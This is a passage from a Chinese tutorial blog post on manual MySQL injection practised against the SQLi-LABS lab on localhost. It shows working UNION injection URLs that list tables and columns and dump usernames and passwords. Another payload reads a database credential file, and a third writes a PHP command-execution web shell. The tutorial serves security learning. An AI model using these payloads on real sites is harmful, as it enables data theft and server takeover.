+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;)-- #</span><br><span class="line">&#x2F;&#x2F;database()指的是当前库</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())-- #</span><br><span class="line">&#x2F;&#x2F;使用十六进制</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;0x7365637572697479)-- #</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200712110927951.png" alt="image-20200712110927951"></p>
+<h2 id="查询列"><a href="#查询列" class="headerlink" title="查询列"></a>查询列</h2><p>查询列名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;)-- #</span><br><span class="line">&#x2F;&#x2F;使用十六进制</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;0x7573657273)-- #</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200712114656323.png" alt="image-20200712114656323"></p>
+<h2 id="查询表内容"><a href="#查询表内容" class="headerlink" title="查询表内容"></a>查询表内容</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,(select concat_ws(&#39;~&#39;,username,password) from security.users limit 0,1)-- #</span><br></pre></td></tr></table></figure>
+
+<p>表单内容不止一行，所以会导致显示不出来的报错</p>
+<p>原本计划使用group_concat的，但会导致username和password连到一块儿不好分辨</p>
+<p>于是乎就使用concat_ws中间插入~符号进行username和password的分割，但情况又出现了concat_ws分割后还是多条数据，只能使用limit进行一行一行的查看</p>
+<p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200714002807954.png" alt="image-20200714002807954"></p>
+<p>还有一种强行使用group_concat的方式，把分隔符加载username和password中间</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,(select group_concat(username,&#39;~&#39;,password) from security.users limit 0,1)-- #</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200714003023733.png" alt="image-20200714003023733"></p>
+<h2 id="其他的信息搜集"><a href="#其他的信息搜集" class="headerlink" title="其他的信息搜集"></a>其他的信息搜集</h2><p>在数据库中也可以查询一些其他的东西，例如user() databases()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,(select user())-- #</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200714003724521.png" alt="image-20200714003724521"></p>
+<p>具体的将表给整理了一下常用的函数</p>
+<h3 id="注入相关函数概述"><a href="#注入相关函数概述" class="headerlink" title="注入相关函数概述"></a>注入相关函数概述</h3><table>
+<thead>
+<tr>
+<th align="center">函数名称</th>
+<th align="center">函数功能</th>
+<th align="left">函数用法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">system_user()</td>
+<td align="center">系统用户名</td>
+<td align="left">select system_user();</td>
+</tr>
+<tr>
+<td align="center">user()</td>
+<td align="center">用户名</td>
+<td align="left">select user();</td>
+</tr>
+<tr>
+<td align="center">current_user()</td>
+<td align="center">当前用户名</td>
+<td align="left">select current_user();</td>
+</tr>
+<tr>
+<td align="center">session_user()</td>
+<td align="center">连接数据库的用户名</td>
+<td align="left">select session_user();</td>
+</tr>
+<tr>
+<td align="center">database()</td>
+<td align="center">数据库名</td>
+<td align="left">查看当前数据库：select database();                                                                                    查看所有数据库：show databases;</td>
+</tr>
+<tr>
+<td align="center">version()</td>
+<td align="center">数据库版本</td>
+<td align="left">select version();                                                                                                                                                                      select @@version();</td>
+</tr>
+<tr>
+<td align="center">@@datadir</td>
+<td align="center">数据库路径</td>
+<td align="left">select @@datadir;</td>
+</tr>
+<tr>
+<td align="center">@@basedir</td>
+<td align="center">数据库安装路径</td>
+<td align="left">select @@basedir;</td>
+</tr>
+<tr>
+<td align="center">@@version_compile_os</td>
+<td align="center">操作系统</td>
+<td align="left">select @@version_compile_os;</td>
+</tr>
+<tr>
+<td align="center">count()</td>
+<td align="center">返回执行结果(条/行)数量</td>
+<td align="left">查看users表中有多少条数据：select count(*) from users;</td>
+</tr>
+<tr>
+<td align="center">concat()</td>
+<td align="center">没有分隔符地连接字符串</td>
+<td align="left">select concat(1,2);  连接1，2输出结果12</td>
+</tr>
+<tr>
+<td align="center">concat_ws()</td>
+<td align="center">含有分隔符的链接字符串</td>
+<td align="left">select concat_ws(“:”,username,password) from users;  使用:作为连接符连接输出users表中的username和password列内容</td>
+</tr>
+<tr>
+<td align="center">group_concat()</td>
+<td align="center">连接一个组所有字符串，并以逗号分隔在一行内输出每一条数据</td>
+<td align="left"><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200705105655813.png" alt="image-20200705105655813">select group_concat(username) from users;</td>
+</tr>
+<tr>
+<td align="center">load_file()</td>
+<td align="center">读取本地文件</td>
+<td align="left">select load_file(‘/demo’);</td>
+</tr>
+<tr>
+<td align="center">into outfile</td>
+<td align="center">写文件</td>
+<td align="left">select ‘mysql’ into outfile ‘/demo’;                                                                                                                这里放于磁盘根目录/demo()</td>
+</tr>
+<tr>
+<td align="center">ascii()</td>
+<td align="center">字符串的ASCII代码值</td>
+<td align="left">select ascii(‘a’);</td>
+</tr>
+<tr>
+<td align="center">ord()</td>
+<td align="center">返回字符串第一个字符的ASCII代码值</td>
+<td align="left">select ord(‘abc’); 这里只返回a的</td>
+</tr>
+<tr>
+<td align="center">mid()</td>
+<td align="center">返回一个字符串的一部分 mid(字符串内容，起始位置，长度)</td>
+<td align="left">select mid(‘helloworld’,6,5); 和其他编程语言不同起始位置就是1，这里输出结果为world</td>
+</tr>
+<tr>
+<td align="center">substr()</td>
+<td align="center">返回一个字符串的一部分</td>
+<td align="left">select substr(‘helloworld’,6,5);</td>
+</tr>
+<tr>
+<td align="center">length()</td>
+<td align="center">返回字符串的长度</td>
+<td align="left">select length(‘hello’);</td>
+</tr>
+<tr>
+<td align="center">left()</td>
+<td align="center">返回字符串的最左面几个字符</td>
+<td align="left">select left(‘kinght’,4);</td>
+</tr>
+<tr>
+<td align="center">floor()</td>
+<td align="center">返回小于或等于x的最大整数</td>
+<td align="left">select floor(3.14); 返回3，这里直接采取摸出小数点后方式</td>
+</tr>
+<tr>
+<td align="center">rand()</td>
+<td align="center">返回0和1之前的一个随机数</td>
+<td align="left">select rand();</td>
+</tr>
+<tr>
+<td align="center">sleep()</td>
+<td align="center">让此语句运行N秒钟</td>
+<td align="left">select sleep(2);</td>
+</tr>
+<tr>
+<td align="center">if()</td>
+<td align="center">if(a,b,c) a为表达式，a为真返回b否则返回c</td>
+<td align="left">select if(1&gt;2,2,3)；</td>
+</tr>
+<tr>
+<td align="center">char()</td>
+<td align="center">返回整数ASCII代码字符组成的字符串</td>
+<td align="left">select char(97);</td>
+</tr>
+<tr>
+<td align="center">STRCMP()</td>
+<td align="center">比较字符串内容(其实就是比大小)</td>
+<td align="left">select STRCMP(‘a’,’b’);   a&gt;b=&gt;1   a=b=&gt;0  a&lt;b=&gt;-1</td>
+</tr>
+<tr>
+<td align="center">IFNULL()</td>
+<td align="center">假如参数1不为NULL，则返回参数1，否则其返回值位参数2</td>
+<td align="left">select ifnull(NULL,2);</td>
+</tr>
+<tr>
+<td align="center">exp()</td>
+<td align="center">返回e的自然对数</td>
+<td align="left">select exp(1);</td>
+</tr>
+<tr>
+<td align="center">extractvalue()</td>
+<td align="center">第一个参数：xml document是String格式，为XML文档对象的名称，文中为DOC                 第二个参数：XPath string(Xpath格式的字符串) 作用：从目标XML中返回包含所查询值的字符串</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="center">updatexml()</td>
+<td align="center">第一个参数：xml document是String格式，为XML文档对象的名称，文中为DOC 第二个参数：XPath string(Xpath格式的字符串)                                                     第三个参数：new value，String格式，替换查找到的符合条件的数据 作用：改变文档中符合条件的节点值</td>
+<td align="left"></td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>extractvalue()和updatexml()是运用在xml里面的</p>
+<p>文档：</p>
+<p>xml:<a target="_blank" rel="noopener" href="https://www.w3school.com.cn/x.asp">https://www.w3school.com.cn/x.asp</a></p>
+<p>xpath：<a target="_blank" rel="noopener" href="https://www.w3school.com.cn/xpath/index.asp">https://www.w3school.com.cn/xpath/index.asp</a></p>
+</blockquote>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>手工注入的最后一步就是提权了</p>
+<p>执行系统命令的方式提权对于mysql是不行的，我们使用的还是读写文件的方式完成提权</p>
+<h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><p>我们直接读取SQLi-LABS配置文件试试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,(select load_file(&#39;&#x2F;ide&#x2F;phpstudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;sql-connections&#x2F;db-creds.inc&#39;))-- #</span><br></pre></td></tr></table></figure>
+
+<p>发现页面没有改变，不过查看页面源代码，发现已经读取成功了，因为有PHP所以不显示</p>
+<p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200714010535076.png" alt="image-20200714010535076"></p>
+<p>我们也可以读去系统文件，例如linux的/etc/password如果权限足够也能读取</p>
+<h3 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h3><p>除去读文件，我们也可以写文件</p>
+<p>我们写一个一句话木马</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select null,null,&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot; INTO DUMPFILE &quot;a.php&quot;-- #</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200714012121510.png" alt="image-20200714012121510"></p>
+<p>写入成功，<code>null,null</code>是为了占位置，毕竟id查询结果是三列嘛(然后现在有个问题，为什么这个会写到MySQL\data\security文件夹里去)</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>kinght
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://kinghtxg.github.io/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/3.Mysql%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95/" title="3.Mysql手工注入方法">https://kinghtxg.github.io/信息安全/Web安全/SQL注入/信息安全/web安全/SQL注入/3.Mysql手工注入方法/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/1.%E5%88%9D%E8%AF%86Python/" rel="prev" title="1.Python介绍">
+                  <i class="fa fa-chevron-left"></i> 1.Python介绍
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/4.SQL%E6%B3%A8%E5%85%A5%E8%AF%AD%E6%B3%95%E7%B1%BB%E5%9E%8B/" rel="next" title="4.SQL注入语法类型">
+                  4.SQL注入语法类型 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+  
+  
+  
+
+
+
+      
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+      
+
+      
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">kinght</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">159k</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/@next-theme/pjax@0.4.0/pjax.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '.page-configurations',
+    '.main-inner',
+    '.post-toc-wrap',
+    '.languages',
+    '.pjax'
+  ],
+  analytics: false,
+  cacheBust: false,
+  scrollRestoration: false,
+  scrollTo: !CONFIG.bookmark.enable
+});
+
+document.addEventListener('pjax:success', () => {
+  pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  const hasTOC = document.querySelector('.post-toc');
+  document.querySelector('.sidebar-inner').classList.toggle('sidebar-nav-active', hasTOC);
+  document.querySelector(hasTOC ? '.sidebar-nav-toc' : '.sidebar-nav-overview').click();
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+    <div class="pjax">
+  
+
+  
+
+    </div>
+</body>
+</html>
